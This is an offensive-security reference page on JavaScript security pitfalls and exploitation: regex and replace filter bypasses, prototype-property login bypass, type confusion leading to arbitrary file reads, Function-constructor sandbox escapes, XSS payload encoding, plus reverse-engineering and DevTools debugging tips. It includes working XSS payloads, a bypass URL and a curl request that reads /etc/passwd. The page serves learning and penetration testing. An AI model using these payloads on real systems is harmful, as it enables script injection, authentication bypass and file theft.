---
description: >-
  A very popular language used to create interactivity on the web, and on the
  backend using NodeJS
---

# JavaScript

## # Related Pages

{% content-ref url="../../web/client-side/cross-site-scripting-xss/" %}
[cross-site-scripting-xss](../../web/client-side/cross-site-scripting-xss/)
{% endcontent-ref %}

{% content-ref url="../../web/frameworks/nodejs.md" %}
[nodejs.md](../../web/frameworks/nodejs.md)
{% endcontent-ref %}

{% content-ref url="prototype-pollution.md" %}
[prototype-pollution.md](prototype-pollution.md)
{% endcontent-ref %}

## Common Pitfalls

### String Replacement

#### `replace` vs `replaceAll`

You might be surprised to see that `replace()` doesn't actually replace all the characters it finds, only the _first_ match. Instead, `replaceAll()` should be used if you want to replace _every_ occurrence. This can be useful if a developer thinks they sanitized user input with this function, and tested it with only one character, while an attacker can just input one dummy character at the start that will be replaced and afterward continue with the payload unsanitized:

<pre class="language-javascript"><code class="lang-javascript"><strong>> 'AAAA'.replace('A', 'B')
</strong>'BAAA'
<strong>> 'AAAA'.replaceAll('A', 'B')
</strong>'BBBB'
// Seems "safe"
<strong>> '&#x3C;svg onload=alert()>'.replace('&#x3C;', '&#x26;lt;').replace('>', '&#x26;gt;')
</strong>'&#x26;lt;svg onload=alert()&#x26;gt;'
// Expoitable with multiple characters
<strong>> '&#x3C;>&#x3C;svg onload=alert()>'.replace('&#x3C;', '&#x26;lt;').replace('>', '&#x26;gt;')
</strong>'&#x26;lt;&#x26;gt;&#x3C;svg onload=alert()>'
</code></pre>

#### Replacement String Templates

The second argument to `replace()` functions determine what should be put in place of the matched part. It might come as a surprise that when this section is user-controlled input, there are some special character sequences that are not taken literally. The following sequences insert a special piece of text instead ([source](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement)):

<table><thead><tr><th width="276">Pattern</th><th>Inserts</th></tr></thead><tbody><tr><td><code>$$</code></td><td>Inserts a <code>"$"</code> (escape sequence)</td></tr><tr><td><code>$&#x26;</code></td><td>Inserts the matched substring</td></tr><tr><td><code>$`</code></td><td>Inserts the portion of the string that <em><strong>precedes</strong></em> the matched substring</td></tr><tr><td><code>$'</code></td><td>Inserts the portion of the string that <em><strong>follows</strong></em> the matched substring</td></tr><tr><td><code>$n</code> (RegExp only)</td><td>Inserts the <code>n</code>th (<code>1</code>-indexed) capturing group where <code>n</code> is a positive integer less than 100</td></tr><tr><td><code>$&#x3C;name></code> (RegExp only)</td><td>Inserts the named capturing group where <code>name</code> is the group name</td></tr></tbody></table>

The `` $` `` and `$'` are especially interesting, as they repeat a preceding or following piece of text, which may contain **otherwise blocked characters**. A neat trick using mentioned [here](https://security.stackexchange.com/a/198461/267531) abuses this to repeat a `</script>` string that would normally be HTML encoded in the payload:

{% code title="Intended functionality" %}
```javascript
payload = "alert()//"  // Naive attempt, will be quoted
payload = "</script><script>alert()//"  // Try to escape tag, will be encoded

encoded = JSON.stringify(payload.replaceAll('<', '&lt;').replaceAll('>', '&gt;'))
'<script>let a = REPLACE_ME</script>'.replace("REPLACE_ME", encoded)
```
{% endcode %}

```html
<script>let a = "alert()//"</script>
<script>let a = "&lt;/script&gt;&lt;script&gt;alert()//"</script>
```

{% code title="Exploit" %}
```javascript
payload = "$'$`alert()//"  // Insert '</script>' following, and '<script>' preceding
```
{% endcode %}

```html
<script>let a = "</script><script>let a = alert()//"</script>
```

### Global Regexes

[regular-expressions-regex.md](../regular-expressions-regex.md "mention") in JavaScript can be written in between `/` slash characters. After the last slash, flags can be given such as `i` for case insensitivity and `g` for [global search](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/global). This global feature is interesting because it can cause some unintuitive behavior if you don't fully understand its purpose.&#x20;

One common mistake is the _lack_ of the global flag in a RegEx that is supposed to replace all characters. When using no regex, only the first match is replaced, the same goes for a non-global regex. Only using a global regex or the `replaceAll` function, all matches will be replaced:

```javascript
"aa".replace("a", "b")    // 'ba'
"aa".replace(/a/, "b")    // 'ba'
"aa".replace(/a/g, "b")   // 'bb'
"aa".replaceAll("a", "b") // 'bb'
```

When a global regex is re-used, another unexpected behavior can happen. The instance's `.test()` and `.exec()` methods will keep save `.lastIndex` value that stores the last matched index. On the next call, the search is only continued from this last index, not from the start. Only if a match fails will it be reset to the start.

While primarily useful for matching against the same string, this can cause unexpected behavior when multiple different strings are matched against the same global RegEx:

<pre class="language-javascript"><code class="lang-javascript"><strong>// String with 2 matches will only match twice, then resets
</strong>const re = /A/g;
re.test("1st A 2nd A") // true  (starting at 0,  lastIndex=5)
re.test("1st A 2nd A") // true  (starting at 5,  lastIndex=11)
re.test("1st A 2nd A") // false (starting at 11, lastIndex=0)
re.test("1st A 2nd A") // true  (starting at 0,  lastIndex=5)

<strong>// lastIndex can be offset by one string, causing another to fail matching
</strong>const re = /A/g;
re.test("....A") // true  (starting at 0, lastIndex=5)
re.test("AAAA")  // false (starting at 5, lastIndex=0)

<strong>// Increasing match position works until it is before lastIndex
</strong>const re = /A/g;
re.test("A")    // true  (starting at 0, lastIndex=1)
re.test(".A")   // true  (starting at 1, lastIndex=2)
re.test("..A")  // true  (starting at 2, lastIndex=3)
re.test("...A") // true  (starting at 3, lastIndex=4)
re.test("..A")  // false (starting at 4, lastIndex=0)
</code></pre>

One example implementation of a check that can be bypassed with this behavior is the following:

<pre class="language-javascript" data-title="Vulnerable Example"><code class="lang-javascript"><strong>const re = /[&#x3C;>"']/g;
</strong><strong>
</strong><strong>function check(arr) {
</strong><strong>    return arr.filter((item) => !re.test(item));
</strong><strong>}
</strong>
const msg = [
    "hello",
    "&#x3C;script>alert()&#x3C;/script>",
    'x" onerror="alert()',
    "bye",
];
console.log(check(msg));  // ['hello', 'bye']
</code></pre>

The above check tries to filter out strings matching characters common in XSS payloads, `<>"'`. It does so with the `/g` global flag and uses `.test()` to check for matches. As we now know, this will remember the `.lastIndex` on any match so that the next check is offset. We can exploit this by intentionally prepending a large string that matches right at the end, putting `.lastIndex=29`. The next match for the script tag or attribute injection will be before the 29th index, and thus not be matched. That allows the following payload to bypass it fully:

{% code title="Exploit" %}
```javascript
const msg2 = [
    "XXXXXXXXXXXXXXXXXXXXXXXXXXXX<",
    "<script>alert()</script>",
    "XXXXXXXXXXXXXXXXXXXXXXXXXXXX<",
    'x" onerror="alert()',
];
console.log(check(msg2));  // ['<script>alert()</script>', 'x" onerror="alert()']
```
{% endcode %}

{% hint style="success" %}
Learn more common RegEx problems in [#common-bypasses](../regular-expressions-regex.md#common-bypasses "mention").
{% endhint %}

### Prototype Properties

In JavaScript, all Objects have a prototype that they inherit methods or properties from. See [prototype-pollution.md](prototype-pollution.md "mention") for a technique that abuses writable prototypes. Here, we will look at abusing the existing prototypes to bypass certain checks when objects are accessed with dynamic keys.&#x20;

Take the following code example:

<pre class="language-javascript" data-title="Vulnerable Example"><code class="lang-javascript">const users = {
  'admin': {
    password: crypto.randomBytes(16).toString('hex'),
  }
};

app.get('/login', (req, res) => {
  const { username, password } = req.query;

<strong>  if (users[username] &#x26;&#x26; users[username].password === password) {
</strong>    res.json(true);
  } else {
    res.json(false);
  }
});
</code></pre>

In this example, the `username` and `password` come from the query string. A check is performed that the username is inside the users dictionary and that its password property matches the given password. Only then will it return `true`.

It is vulnerable because not just `'admin'` is a valid key in the `users` object. Its inherited prototype properties like `.constructor` or `.toString` are still valid properties, but are functions instead of a password entry to match against. The `users[username]` will pass, but then its `.password` property will become `undefined`. Luckily, we can match this with our given password by removing the `password` query parameter, making it undefined as well.

{% code title="Payload URL" %}
```
/login?username=toString
```
{% endcode %}

```javascript
username = "toString"
password = undefined
users[username] -> [Function: toString]             // true
users[username].password -> undefined === password  // true
```

This was a solution to a simple JavaScript CTF challenge with a detailed writeup below:

{% embed url="https://jorianwoltjer.com/blog/p/ctf/wizer-ctf-may-2024/4-sensitive-flags" %}
Writeup of a challenge that uses `users[username]` and could be bypassed
{% endembed %}

### Type Confusion

Most often, user input is a [`String`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String). However, some functions for getting query parameters or JSON are able to return more types like [`Array`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array)s or [`Object`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object)s. An application may not expect this and handle it improperly. With the flexibility of JavaScript this is especially often the case.

JSON can obviously have different types by writing `["first","second"]` or `{"key":"value"}` syntax, but query parameters are more complicated. It depends on the parser, but some common ways to create _Arrays_ include:

* `array=first&array=second`
* `array[]=first&array[]=second`
* `array[0]=first&array[1]=second`

These may all be parsed as `["first","second"]`. It is sometimes also possible to create _Objects_ by giving keys inside the brackets (`[]`), and combined with arrays:

* `object[key]=value&object[array][]=first`

This syntax could create `{"key":"value","array":["first"]}`. When you know what is possible, you can think of how the code will handle such unexpected types.

One common trick is to **confuse&#x20;**_**Strings**_**&#x20;and&#x20;**_**Arrays**_, because a lot of their methods/attributes correspond. Imagine a developer wants to validate their input and check if a [`String.includes()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/includes) any dangerous characters. Any regular string will be caught here, but if we make our input an array, the `.includes()` method suddenly refers to [`Array.includes()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/includes). This method only checks if any of its items are fully equal, not if the character exists in the string. \
Code like the following could be bypassed:

<pre class="language-javascript" data-title="Vulnerable Example"><code class="lang-javascript">app.get('/', (req, res) => {
    const name = req.query.name
<strong>    if (name.includes("&#x3C;") || name.includes(">")) {
</strong>        res.send('Invalid name');
    }
    res.send(`&#x3C;h1>Hello, ${name}!&#x3C;/h1>`);
});
</code></pre>

By turning our input into an array by providing a second `name=` parameter, the check will only verify if any of the parameters are exactly equal to `<` or `>`.

<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption><p>Exploit using multiple <code>name=</code> parameters to turn it into an array, resulting in XSS</p></figcaption></figure>

Another thing that strings and arrays have in common is their `.toString()` method, which you can see in full effect above. While most objects just turn into `[object Object]` by default, arrays will turn into their items stringified and joined by commas (`,`). This is useful for injections as they often still allow arbitrary input in their items to reflect when written somewhere.

**Objects** are also interesting because some library methods will accept them as **`options`**. These may include special settings that you can now change, that would normally default if you input a string. One example is [`res.download()`](https://expressjs.com/fr/api.html#res.download) from Express ([writeup](https://mizu.re/post/heroctf-v6-writeups#sampleHub)). As the 2nd argument, it accepts _either a String as the returned filename, or an Object with options_. With the `root:` option it is possible to change the relative parent of the 1st argument, and potentially read arbitrary files:

{% code title="Vulnerable Example" %}
```javascript
app.get("/download/:file", (req, res) => {
    const file = path.basename(req.params.file);
    res.download(file, req.query.filename || "file.bin");
});
```
{% endcode %}

The `file` path parameter may only be relative due to `path.basename()`, but using the query parameter `filename` which is normally a string, we can use brackets (`[]`) to turn it into an object. Then, we will provide the documented `root:` option to make it read from an arbitrary directory:

```shell-session
$ curl -g 'http://localhost:3000/download/passwd?filename[root]=/etc'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### Sandboxing

If the program attempts to let you execute only a limited amount of JavaScript features in order to safely execute code, you can look for _sandbox escapes_. With how flexible JavaScript is, there are many easy mistakes to make. This section will primarely take about **expression evaluators** that have limited functionality.

The main goal to reach is often the [`Function()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function) constructor. This function takes a string argument which is its function body, and can then be called to execute it. This effectively serves as an alternative to "eval". It is easy to reach through the [`.constructor`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor) property all objects have, because when accessed on any function, it gives this Function constructor.

{% code title="Examples" %}
```javascript
Function("return 1337")();
"".toString.constructor("return 1337")();  // Get from any function's .constructor
"".constructor.constructor("return 1337")();  // A constructor is a function itself
""["constructor"]["constructor"]("return 1337")();  // Syntax doesn't matter
```
{% endcode %}

That means if you have any way of **accessing arbitrary properties** on an object, and then **calling** them, you'll be able get to and call this "eval" to run arbitrary code.

#### Common gadgets

Expression evaluators often work with a global `variables` or `scope` object on which any defined variables are accessed as properties (eg. `variables[name]=value`). Without validation, this pattern allows you to access prototype properties of `variables` by referencing a global variable named `toString` or `constructor`.

```javascript
constructor.constructor('return 1337')()
```

Another source of arbitrary property access is custom functions that are available for your expressions. These may also access properties without thinking about validating which ones are safe. [This writeup](https://warpnet.nl/blog/pwndoc-hacking-a-reporting-tool/#pwndoc-sandbox-escape-to-rce-using-custom-filters-cve-2024-55652) shows an example where a property was access for every item in an array, allowing you to put the source object in a single-item array and retrieving the result at index 0.

```javascript
([1] | select: 'constructor' | select: 'constructor')[0]('return 1337')()
```

#### Only "own properties"

Previously in `angular-expressions`, there [was a vulnerability](https://warpnet.nl/blog/pwndoc-hacking-a-reporting-tool/#the-vulnerability) where you could only access one arbitrary property as a global variable. From there, property access was checked using [`.hasOwnProperty()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwnProperty) to ensure only "own properties" are allowed. This means any inherited properties from the prototype were not allowed, but already having access to a variable like [`Object`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object), this is enough to execute arbitrary code.

The trick here is that `.constructor` directly on the [`Object()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/Object) constructor comes from the prototype, not an own property. Therefore we need to first access its prototype which _does_ have constructor as an own property. This can be done by calling [`Object.getPrototypeOf()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/getPrototypeOf) on any function, from which we can access the Function constructor again:

```javascript
constructor.getPrototypeOf(constructor).constructor('return 1337')()
```

#### Only methods

In a situation where regular property is checked, but methods aren't, you can still access the Function constructor using the deprecated [`__lookupGetter__()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/__lookupGetter__), then use [`.call()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/call) to call it with a method.

```javascript
"".__lookupGetter__("__proto__").constructor("return 1337").call()
```

#### Prototype Pollution

If `.constructor` chaining to get to `Function()` is disabled (eg. via `delete Function.prototype.constructor`), you can still achieve impact by polluting the global prototypes, named [prototype-pollution.md](prototype-pollution.md "mention"). There's a few different ways allowing you to do that from any object depending on your restrictions ([source](https://x.com/arkark_/status/1943260773268230205)). The best part is that using the setters, you don't need to call any methods.

{% code title="Examples" %}
```javascript
const obj = {};

obj.__proto__.polluted = true;
obj.constructor.prototype.polluted = true;
obj.constructor.getPrototypeOf(obj).polluted = true;
obj.__lookupGetter__("__proto__").call(obj).polluted = true;
```
{% endcode %}

## Filter Bypass

Often alphanumeric characters are allowed in a filter, so being able to decode Base64 and evaluate the result should be enough to do anything while bypassing a filter. Acquiring the primitives to do this decoding and evaluating however can be the difficult part as certain ways of calling the functions are blocked. The simplest idea is using `atob` to decode Base64, and then `eval` to evaluate the string:

<pre class="language-javascript"><code class="lang-javascript"><strong>> btoa("alert()")  // Encoding
</strong>'YWxlcnQoKQ=='
<strong>> atob("YWxlcnQoKQ")  // Decoding
</strong>'alert()'

<strong>eval(atob("YWxlcnQoKQ"))  // Obfuscated payload
</strong></code></pre>

### Inside a String

When injecting inside of a JavaScript string (using `"` or `'` quotes), you may be able to escape certain blocked characters using the following escape sequences with different properties:

* `\x41` = `'A'`: Hex escape, shortest! ([CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Hex\('None',0\)Find_/_Replace\(%7B'option':'Regex','string':'..'%7D,'%5C%5Cx$%26',true,false,true,false\)\&input=YWxlcnQoKQ))
* `\u0041` = `'A'`: Unicode escape, non-ASCII characters too! ([CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Hex\('None',0\)Find_/_Replace\(%7B'option':'Regex','string':'..'%7D,'%5C%5Cu00$%26',true,false,true,false\)\&input=YWxlcnQoKQ))
* `\101` = `'A'`: Octal escapes, numeric-only payload! ([CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Octal\('Space'\)Find_/_Replace\(%7B'option':'Regex','string':'.*'%7D,'%20$%26',false,false,true,true\)Find_/_Replace\(%7B'option':'Regex','string':'%20\(%5C%5Cd%2B\)'%7D,'%5C%5C%5C%5C$1',true,false,true,false\)\&input=YWxlcnQoKQ))

Other than these generic escapes, there are a few special characters that get their own escapes:

<table><thead><tr><th width="134" align="right">Syntax</th><th>Meaning</th></tr></thead><tbody><tr><td align="right"><code>\\</code></td><td>Backslash</td></tr><tr><td align="right"><code>\'</code></td><td>Single quote</td></tr><tr><td align="right"><code>\"</code></td><td>Double quote</td></tr><tr><td align="right"><code>\`</code></td><td>Backtick</td></tr><tr><td align="right">(0x0a) <code>\n</code></td><td>New Line</td></tr><tr><td align="right">(0x0d) <code>\r</code></td><td>Carriage Return</td></tr><tr><td align="right">(0x09) <code>\t</code></td><td>Horizontal Tab</td></tr><tr><td align="right">(0x0b) <code>\v</code></td><td>Vertical Tab</td></tr><tr><td align="right">(0x08) <code>\b</code></td><td>Backspace</td></tr><tr><td align="right">(0x0c) <code>\f</code></td><td>Form Feed</td></tr></tbody></table>

When inside [template literals](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals) (using `` ` `` backticks), you can use `${}` expressions to evaluate inline JavaScript code which may contain any code you want to run, or evaluate to any string you need.&#x20;

```javascript
`${alert()}`
`${String.fromCharCode(97,110,121,116,104,105,110,103)}` -> 'anything'
```

{% hint style="info" %}
Unrelated to strings, you can also use these templates as "[tagged templates](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates)" to call functions without parentheses:

```javascript
alert``
```

More of these kinds of tricks can be found in:

{% embed url="https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md" %}
List of ways to call functions without parantheses, useful for bypassing filters/restrictions
{% endembed %}
{% endhint %}

### No alphanumeric characters

{% embed url="https://jsfuck.com/" %}
An encoder that can create self-executing JavaScript code with only 6 special characters
{% endembed %}

### Without `"` quotes

`RegExp` objects can be defined by surrounding text with `/` slashes, and are automatically coerced into a string surrounded by slashes again. This can become valid executable JavaScript code in a few different ways:

<pre class="language-javascript"><code class="lang-javascript"><strong>eval(1+/1,alert(),1/+1)  // Use numbers to turn '/' into a divide
</strong>1/1,alert(),1/1

<strong>eval(unescape(/%2f%0aalert()%2f/))  // Use unescape() with URL encoding and newlines
</strong>//
alert()//

<strong>eval(/alert()/.source)  // Use .source to extract the inner text of RegExp
</strong>alert()
</code></pre>

Another common method is using `String.fromCharCode()` chains to build out string character-by-character:

{% code title="Python" %}
```python
>>> f"String.fromCharCode({','.join(str(ord(c)) for c in 'alert()')})"
'String.fromCharCode(97,108,101,114,116,40,41)'
```
{% endcode %}

<pre class="language-javascript"><code class="lang-javascript"><strong>eval(String.fromCharCode(97,108,101,114,116,40,41))
</strong>alert()
</code></pre>

### Strings from other sources

In a web environment, cross-origin JavaScript can still access a few properties under your control that may be useful for smuggling strings with the injection is limited. The best example is the shortest possible XSS payload in Chrome: `eval(name)`.

The `name` variable refers to [`window.name`](https://developer.mozilla.org/en-US/docs/Web/API/Window/name) and can be set by the site that opens it using the `target` parameter. It is also kept across redirects, making it potentially useful for exfiltrating as well.

The logic below sets the current window's name to the XSS payload, and then uses `window.open()` to overwrite itself with the same name. This puts the name variable on the target site so it can `eval()` the value successfully:

<pre class="language-html"><code class="lang-html">&#x3C;script>
<strong>  name = "alert(origin)"
</strong><strong>  window.open("https://example.com?xss=eval(name)", "alert(origin)")
</strong>&#x3C;/script>
</code></pre>

To get different names instead of just one, you can refer to `opener.name` if the opener is same-origin with the target. This can be repeated like `opener.opener.name` to get an arbitrary number of strings you set, but every additional opener requires a `window.open()` call which is a user interaction on your site.

Using iframes, you can get the same effect but only using a single opener. We will access them via their `name=` attribute on the window reference, so this cannot contain an arbitrary string anymore. However, the `location.hash` may also work, it just needs a `.slice(1)` to get rid of the first `#`.&#x20;

This combines into a way to get arbitrary strings with only the charset `[a-z().]`. You just need to be able to iframe any page same-origin with the target, such as an error page with `/%00` or a too-long URI. Below is a proof of concept using this idea:

```html
<iframe src="https://example.com/%00#anything" name="a"></iframe>
<iframe src="https://example.com/%00#more text<>!..." name="b"></iframe>
<script>
  onclick = () => {
    window.open("https://example.com")
  }
</script>
```

The `https://example.com` popup can now access the prepared strings like this:

```javascript
unescape(opener.a.location.hash.slice(unescape.length))  // 'anything'
unescape(opener.b.location.hash.slice(unescape.length))  // 'more text<>!...'
```

### Comments

A few different and uncommon ways of creating comments in JavaScript:

```javascript
alert()//Regular comment

alert()/*multiline
comment*/alert()

alert()<!--HTML comment

#!shebang comment (start of file and remote source only)

-->HTML comment (start of line only)
```

### Fix broken code with Hoisting

{% embed url="https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios" %}
Good explanation of hoisting and exploitable scenarios
{% endembed %}

While not necessarily being a "Filter Bypass", this quirk is useful for [cross-site-scripting-xss](../../web/client-side/cross-site-scripting-xss/ "mention") injections where some variables/functions are not defined before your payload, causing the script to fail before it reaches your malicious code. Take the following example:

{% code title="Vulnerable Code" %}
```javascript
func('test', 'INJECTION');
```
{% endcode %}

It looks like simply closing the `'` at the injection point will do, to create a payload like this:

{% code title="Naive exploit" %}
```javascript
func('test', ''-alert(origin)-''); 
```
{% endcode %}

But what if `func` isn't defined for some reason? You'll receive the following runtime error before the alert pops:

> Uncaught ReferenceError: `func` is not defined

The solution is to abuse "hoisting", a process in JavaScript where during parsing, any function declarations will be **moved to the top**. This allows a function to be used before it is defined from top to bottom in a file. It is best shown with an example:

<pre class="language-javascript"><code class="lang-javascript">func('test', 'test'); 

<strong>function func(a, b) {
</strong><strong>    return 1
</strong><strong>};
</strong>
alert(origin);//');
</code></pre>

If `func` was `func.someMethod`, this would still fail because undefined is not callable and our alert payload later in the code won't get executed. However, before the property read on func, the arguments to the function are evaluated including our injection point. We just need to put the alert inline here:

```javascript
func.someMethod('test', ''-alert(origin)-''); 

function func(a, b) {
    return 1
};//')
```

Similarly, undefined variables can be declared anywhere in the code with `var`:

<pre class="language-javascript"><code class="lang-javascript">func(a, 'test'); 

<strong>var a = 1;
</strong>
alert(origin);//');
</code></pre>

## Reverse Engineering

Client-side javascript is often minified or obfuscated to make it more compact or harder to understand. Luckily there are many tools out there to help with this process of reverse engineering, like the **manual** [JavaScript Deobfuscator](https://willnode.github.io/deobfuscator/). While manually trying to deobfuscate the code, dynamic analysis can be very helpful. If you find that a function decrypts some string to be evaluated for example, try throwing more strings into that function at runtime with _breakpoints_.&#x20;

While doing it manually will get you further, sometimes it's quicker to use automated tools made for a specific obfuscator. The common [obfuscator.io](https://obfuscator.io/) for example can be perfectly deobfuscated using `webcrack`, as well as minified/bundled code:&#x20;

{% embed url="https://github.com/j4k0xb/webcrack" %}
Deobfuscate specific obfuscators, and unminify/unbundle a single file
{% endembed %}

```bash
curl https://example.com/script.js | webcrack -o example
```

### Source maps

Bundled/minified code is often hard to read, even with the abovementioned tools. If you're lucky, a website might have published `.map` source map files together with the minified code. These are normally used by the DevTools to recreate source code in the event of an exception while debugging. But we can use these files ourselves to recreate the exact source code to the level of comments and whitespace!

Viewing these in the DevTools is easy, just check the **Sources** -> **Page** -> **Authored** directory to view the source code if it exists:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>2 source code files with <code>.ts</code> TypeScript and <code>.scss</code> CSS using source maps</p></figcaption></figure>

It gets these from the special `//# sourceMappingURL=` comment at the end of minified JavaScript files, which are often the original URL **appended** with `.map`. Here is an [example](https://parcel-greet.netlify.app/):

{% code title="index.7808df6e.js" overflow="wrap" %}
```javascript
document.querySelector("button")?.addEventListener("click",(()=>{const e=Math.floor(101*Math.random());document.querySelector("p").innerText=`Hello, you are no. ${e}!`,console.log(e)}));
//# sourceMappingURL=index.7808df6e.js.map
```
{% endcode %}

{% code title="index.7808df6e.js.map" overflow="wrap" %}
```json
{"mappings":"AAAAA,SAASC,cAAc,WAAWC,iBAAiB,SAAS,KAC1D,MAAMC,EAAcC,KAAKC,MAAsB,IAAhBD,KAAKE,UAEnCN,SAASC,cAAc,KAA8BM,UAAY,sBAAyBJ,KAC3FK,QAAQC,IAAIN,EAAA","sources":["src/script.ts"],"sourcesContent":["document.querySelector('button')?.addEventListener('click', () => {\n  const num: number = Math.floor(Math.random() * 101);\n  const greet: string = 'Hello';\n  (document.querySelector('p') as HTMLParagraphElement).innerText = `${greet}, you are no. ${num}!`;\n  console.log(num);\n});"],"names":["document","querySelector","addEventListener","num","Math","floor","random","innerText","console","log"],"version":3,"file":"index.7808df6e.js.map"}
```
{% endcode %}

There exists a tool `sourcemapper` that can take a URL and extract all the source code files:

{% embed url="https://github.com/denandz/sourcemapper" %}
Extract source files from `.map` URLs into an output directory
{% endembed %}

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ sourcemapper -url https://parcel-greet.netlify.app/index.7808df6e.js.map -output example
</strong>[+] Retrieving Sourcemap from https://parcel-greet.netlify.app/index.7808df6e.js.map.
[+] Read 646 bytes, parsing JSON.
[+] Retrieved Sourcemap with version 3, containing 1 entries.
[+] Writing 280 bytes to example/src/script.ts.
[+] Done
<strong>$ cat example/src/script.ts
</strong>document.querySelector('button')?.addEventListener('click', () => {
  const num: number = Math.floor(Math.random() * 101);
  const greet: string = 'Hello';
  (document.querySelector('p') as HTMLParagraphElement).innerText = `${greet}, you are no. ${num}!`;
  console.log(num);
});
</code></pre>

### Local Overrides

{% embed url="https://developer.chrome.com/docs/devtools/overrides" %}
DevTools documentation explaining content overrides
{% endembed %}

One very useful feature of Chrome's DevTools is its Local Overrides system. You can override the content of any URL by editing a file locally, while you have the DevTools open.

Start by setting up local overrides as explained in the link above. Once configured and enabled (under _Sources_ -> _Overrides_ -> _Enable Local Overrides_), you can edit any file in the _Sources_ tab and press _Ctrl+S_ to save it. Edits in CSS properties will also be saved. From the _Network_ tab, you can even override response headers in a special `.headers` file.

You can notice any overridden files by the ![](<../../.gitbook/assets/image (3) (1).png>) icon that appears, and disable it completely by unchecking _Enable Local Overrides_.

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt="" width="563"><figcaption><p>Example of editing some files in <em>Sources</em></p></figcaption></figure>

{% hint style="warning" %}
**Note**: This feature only works when DevTools are open. If you reload the page while they are closed, the overrides will not be used.
{% endhint %}

{% hint style="warning" %}
**Note**: This feature does _not_ work in the _Burp Suite Browser_, because some default arguments prevent access to the filesystem. [This is a known issue](https://forum.portswigger.net/thread/cannot-set-up-chromium-devtools-overrides-in-embedded-browser-acb1b518) and you should use your local Chrome installation instead.
{% endhint %}

### Frames

When looking at complex or edge cases, it can be useful to know how the browser understands the current context. The _Application_ -> _Frames_ panel in Chrome is useful for this as it shows a variety of properties of all frames in the current tab, like how the `Content-Security-Policy` is parsed, the Origin, the Owner Element, and much more ([source](https://x.com/ctbbpodcast/status/1822698310429216784)).

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption><p>Example of Twitter's top frame</p></figcaption></figure>

### Snippets

Useful bits of JavaScript that can quickly give information about an application, or help in an exploit. Run these in the **DevTools Console** or at will using a [Bookmarklet](https://caiorss.github.io/bookmarklet-maker/).

#### Log all non-default global (window) variables

```javascript
const iframe = document.createElement('iframe');
document.body.appendChild(iframe);
const defaultProps = new Set(Object.getOwnPropertyNames(iframe.contentWindow));
iframe.remove();

for (const prop in window) {
    if (window.hasOwnProperty(prop) && !defaultProps.has(prop)) {
        console.log(prop, window[prop]);
    }
}
```

### Debugging

While in the DevTools, the **Sources** tab shows a file structure of all loaded resources per frame. Choose any `.js` file you want here and press on the line number on the left to set a _breakpoint_. Whenever the runtime hits this line of code now, the whole tab will freeze and let you inspect local variables, step through the code and use the _Console_ to run small tests in the context of the frozen position.

In addition to this, right-clicking a line number allows you to add [different types of breakpoints](https://developer.chrome.com/docs/devtools/javascript/breakpoints/#overview). For example, a _conditional breakpoint_ will only freeze if a certain condition is `true`, for when a function executes many times but you only care about one specific execution of it.

The _logpoint_ also also useful because it never freezes, only logs a value with access to local variables to the Console for you to inspect. This effectively also allows you to insert code into the source similar to using [#local-overrides](./#local-overrides "mention"). To get global access to a local variable, for example, you can use this hack to save it to a `window.` property without a whole freeze, so you can access it while the application is running.

{% code title="Accessing `ws` variable" %}
```javascript
window.ws = ws
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption><p>Using logpoint to make WebSocket variable in other scope accessible globally</p></figcaption></figure>

{% hint style="warning" %}
While stepping through the code, if source maps will by default be applied to give you a better reading experience. But if the minified code's _control flow_ is different enough, it can cause strange situations where the cursor jumps around not as you expect.\
You can disable source maps by pressing `Ctrl+Shift+P` and choosing **Disable JavaScript source maps**
{% endhint %}

When editing the code or triggering a Cross-Site Scripting payload, you can execute the `debugger;` statement to quickly break at any time, without having to configure it in the browser. This is useful when **evaluating code** without line numbers that you can set beforehand.

If you're unsure what piece of code is triggering something, you can try to find it by setting generic breakpoints for a few different events:

* **Events**: In the **Sources** tab, the right side panel has a section for _Event Listener Breakpoints_ where you can enable breakpoints for any global events. This includes things like `window.close` to prevent closing a window while you're debugging, which would be annoying otherwise.
* **DOM node modification**: On the **Elements** tab, right-click any element and choose _Break on_ followed by what type of modification you want to track.\
  The moment any piece JavaScript removes or modifies the node or its children, you will break on that piece of code.
*   **Any built-in function call**: Run `debug(function)` in the Console or source code to break whenever that function passed as the first argument is called.

    {% code title="Examples" %}
    ```javascript
    debug(alert)  // Whenever alert() is called
    debug(DOMParser.prototype.parseFromString)  // Method on DOMParser instance
    ```
